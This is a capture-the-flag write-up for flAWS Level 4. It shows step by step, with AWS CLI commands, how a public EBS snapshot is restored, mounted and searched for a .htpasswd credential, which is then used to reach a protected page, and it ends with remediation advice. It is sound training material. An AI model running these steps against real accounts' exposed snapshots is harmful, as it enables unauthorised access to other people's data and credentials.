# flAWS - Level 4

---

## Vulnerability Overview

AWS EBS (Elastic Block Store) snapshots are backups of EC2 disk volumes. By default, snapshots are private, but they can be made public — either intentionally or by misconfiguration. A publicly accessible snapshot contains the **full disk image** of the original instance at the time of the backup: all files, credentials, configs, and application data.

The attack chain here is: discover the snapshot ID → restore it to a new volume → attach it to an attacker-controlled instance → mount and browse the filesystem. No vulnerabilities in the application itself are required — just access to the snapshot.

---

## Steps to Solve the Lab

**Step 1: Enumerating EC2 Instances**

```bash
aws ec2 describe-instances --region us-west-2
```

Returns a running instance: ID `i-0f6af112ec186339b`, public IP `35.94.9.9`, type `t3.micro`, AZ `us-west-2b`.

**Step 2: Discovering EBS Volume Snapshots**

```bash
aws ec2 describe-snapshots --region us-west-2 --owner-id 975426262029
```

Returns snapshot ID `snap-0b49342abd1bdcb89` — a completed 8 GiB snapshot from 2017-02-28. It should be private but is publicly accessible.

**Step 3: Creating a New Volume from Snapshot**

```bash
aws ec2 create-volume \
  --snapshot-id snap-0b49342abd1bdcb89 \
  --availability-zone us-west-2b \
  --region us-west-2 --profile default
```

Creates volume `vol-0ffc1f4300a98d575` (8 GiB, gp2) in the same AZ as the target instance.

**Step 4: Attaching the Volume to an Instance**

```bash
aws ec2 attach-volume \
  --volume-id vol-0ffc1f4300a98d575 \
  --instance-id i-0f6af112ec186339b \
  --device /dev/sdf --region us-west-2
```

The volume attaches as `/dev/sdf`, appearing as `/dev/nvme1n1` in the Linux kernel due to NVMe naming conventions.

**Step 5: SSH Access to the Instance**

```bash
ssh ubuntu@35.94.9.9 -i flaws4.pem
```

Logs in to Ubuntu 24.04 on the challenge EC2 instance.

**Step 6: Verifying the Attached Device**

```bash
lsblk
```

Shows `nvme0n1` (root, 8 GiB) and `nvme1n1` (newly attached snapshot volume, 8 GiB, unmounted).

**Step 7: Mounting the Snapshot Volume**

Create a mount point and attach the snapshot volume to the filesystem:
```bash
sudo mkdir /mnt/flaws
sudo mount /dev/nvme1n1p1 /mnt/flaws
ls /mnt/flaws
```

The snapshot volume is now mounted at `/mnt/flaws`, exposing all files from the original instance. Directory listing shows `bin`, `boot`, `dev`, `etc`, `home`, `lib`, `lost+found`, `media`, `mnt`, `opt`, `proc`, `root`, `run`, `sbin`, `snap`, `srv`, `sys`, `usr`, `var`, `vmlinuz`, `vmlinuz.old`. This represents the complete filesystem from the original EC2 instance at the time the snapshot was created.

**Step 8: Exploring the Snapshot Contents**

Navigate to the home directory to find configuration and credential files:
```bash
cd /mnt/flaws/home/ubuntu/
ls -la
```

Files discovered in the home directory include `meta-data` (Instance metadata file), `setupNginx.sh` (Nginx setup script), and `.htpasswd` (HTTP Basic Authentication password file). These files contain sensitive configuration and authentication information from the original instance.

**Step 9: Discovering Credentials in Configuration Files**

Examine the HTTP authentication password file which contains plaintext credentials: `cat /mnt/flaws/home/ubuntu/.htpasswd`
Output reveals: `htpasswd -b /etc/nginx/.htpasswd flaws <password>`

> **CTF Note:** The actual password value was visible in the snapshot. It is an intentionally exposed challenge credential published by flaws.cloud as part of the lab solution — permanently revoked and not reused anywhere.

This shows the password was set using htpasswd with the `-b` (batch) flag, storing it in plaintext in the home directory. Anyone with access to the EBS volume can read this file directly.

**Step 10: Accessing the Protected Web Page**

Use the discovered credentials to access the protected web application:
```bash
curl --basic -u flaws:<password-from-snapshot> http://4d0cf09b9b2d761a7d87be99d1750bce8b86f3b.flaws.cloud
```

---

## Key Takeaway

The `.htpasswd` file stored the Nginx basic auth credentials in the home directory. Because the EBS snapshot was publicly accessible, anyone could mount the volume and read this file — no exploitation needed, just disk access.

## Remediation

- **Never make EBS snapshots public** unless they are intentionally distributable images (e.g., AMIs for Marketplace).
- **Audit snapshot permissions regularly**: `aws ec2 describe-snapshots --owner-id <account-id>` — check for `"Group": "all"` in permissions.
- **Encrypt EBS volumes** with a KMS key — encrypted snapshots cannot be shared without also sharing the key.
- **Don't store plaintext credentials on disk** — use AWS Secrets Manager or SSM Parameter Store instead.
